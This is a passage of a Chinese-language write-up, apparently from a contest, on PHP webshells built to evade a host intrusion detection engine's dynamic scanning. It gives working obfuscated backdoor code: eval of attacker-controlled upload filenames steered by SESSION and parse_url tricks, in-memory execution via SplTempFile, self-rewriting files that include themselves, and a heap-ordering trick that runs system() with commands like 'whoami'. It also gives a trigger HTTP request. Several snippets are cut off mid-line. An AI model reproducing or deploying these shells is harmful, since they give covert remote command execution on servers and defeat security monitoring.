        DivisionByZeroError 
      AssertionError 
      ParseError 
      TypeError 
        ArgumentCountError 
    Exception 
      ClosedGeneratorException 
      DOMException 
      ErrorException 
      IntlException 
      LogicException 
        BadFunctionCallException 
          BadMethodCallException 
        DomainException 
        InvalidArgumentException 
        LengthException 
        OutOfRangeException 
      PharException 
      ReflectionException 
      RuntimeException 
        OutOfBoundsException 
        OverflowException 
        PDOException 
        RangeException 
        UnderflowException 
        UnexpectedValueException 
      SodiumException 
0x08 SESSION 
如果动态引擎去检查，他应该没有 SESSION，至少是在第一次的时候。 
$c,"two"=>&$c ); 
$url = "http://a/usr/".$_SESSION['a']."?a=1"; 
$d =parse_url($url); 
if($d['query']){ 
    $c="echo 111;"; 
} 
else{ 
    $c=$_FILES['useraccount']['name']; 
} 
var_dump($a["two"]); 
eval($a["two"]); 
?> 
模式基本上是与之前相同的，不同之处在于引入了 SESSION 变量来干扰 URL 解析，不
知为何，这样一次就通过了检测。其实更加高级的方法应该是这样的： 
$c,"two"=>&$c ); 
$url = "http://a/usr/".$_SESSION['a']."?a=1"; 
$d =parse_url($url); 
if($d['query']){ 
    $c="echo 111;"; 
} 
else{ 
    $c=$_FILES['useraccount']['name']; 
} 
var_dump($a["two"]); 
eval($a["two"]); 
$_SESSION['a']="#"; 
?> 
由于规则需要一次性执行成功，因此需要在文件末尾加入： 
if ($_SESSION['a']!="#"){ 
    $_SESSION['a']="#"; 
    print(1); 
    include(get_included_files()[0]); 
} 
触发该 WebShell 的 HTTP 请求为： 
POST /x.php HTTP/1.1 
Host: x 
Content-Type: multipart/form-data;boundary=a; 
Content-Length: 101 
Cookie: PHPSESSID=bkukterqhtt79mrso0p6ogpqtm; 
--a 
Content-Disposition: form-data; name="useraccount"; filename="phpinfo();" 
phpinfo(); 
--a-- 
0x09 SESSION 扩展 
利用 SessionHandlerInterface 扩展的接口可以神不知鬼不觉地执行特定函数，直
接看代码： 
fwrite( $_GET['a']); 
$a->rewind(); 
substr(get_declared_classes()[72],4,6)($a->fgets()); 
?> 
根据 PHP 文档： 
如果设置了 maxMemory（默认 2M），那么 SplTempFile 会在内存中，这样就不存在文
件落地的问题了，写入内存后加载。 
0x0B 修改自身 
修改自身的洞都被认定为同一种绕过手法了，而且已经有人先提交，因此被忽略了，但
是仍然写出来供大家参考。 
fwrite("fwrite("(\$_"."GET"."[a]);?>"); 
include(get_included_files()[0]); 
?> 
直接的文件读写函数被禁止了，因此需要通过 SplFileObject 来写，由于需要一次性执行
和稳定触发，写入之后需要自己 include 自己。这种 WebShell 很有趣，就像是披着羊皮的
狼，上传的时候看起来平平无奇，被执行一次以后就完全变了模样。 
沿用这个思路，还有一个点是可以写文件的： 
fputcsv($a,'l'); 
$file=null; 
include(get_included_files()[0]); 
?> 
不同之处在于，这里使用的是 fputcsv，此时，需要将写入文件以后所产生的分隔符进
行注释，因此在构造 payload 时需要花点心思。 
更进一步，使用这个方法加载缓存也是可以的： 
fputcsv(explode('m',"evam(\$_GET[m]);"),'l'); 
$file->rewind(); 
eval($file->fgets()); 
?> 
不过被认定为与内存重复了。 
0x0C 堆排序 
动态查杀引擎根据模拟执行的情况来进行判断，那么我们能否将好的坏的掺在一起，这
就像一个箱子里面有个 5 球，按号码从大到小摆放好，按顺序取，想办法让引擎取到正常的
球，而我们执行的时候通过控制参数取到能变为 WebShell 的球。我先放入 3 个正常的球 0、
7、8 和一个恶意的球'system'，还有一个球我通过 GET 参数控制，暂且称之为 x。 
当 x 取大于 8 以上的数字时，会有一个最大堆（绿色为按最大堆顶点依次导出的顺序）： 
当 x 取 “a” 时： 
而 x 取 “99;ls” 时： 
由此可见：不同的参数值，能够引发堆结构的改变。经过多次 Fuzz 测试，我发现 HIDS
查杀引擎对第三种情况没有考虑，于是，我通过依次将 i 取 1 和 i 取 2 来提取变量$a 和$b，
再通过 $a($b); 执行命令。 
当然，在这种情况下，利用的 Payload 只能是 x.php?a=99;whoami 这种格式。 
insert( $_GET[a] ); 
$obj->insert( 8 ); 
$obj->insert( 'system' ); 
$obj->insert( 7 ); 
$obj->insert( 0 ); 
//$obj->recoverFromCorruption(); 
$i=0; 
foreach( $obj as $number ) { 
    $i++; 
    if($i==1) { 
        $a = $number; 
    } 
    if($i==2) { 
        $b = $number; 
    } 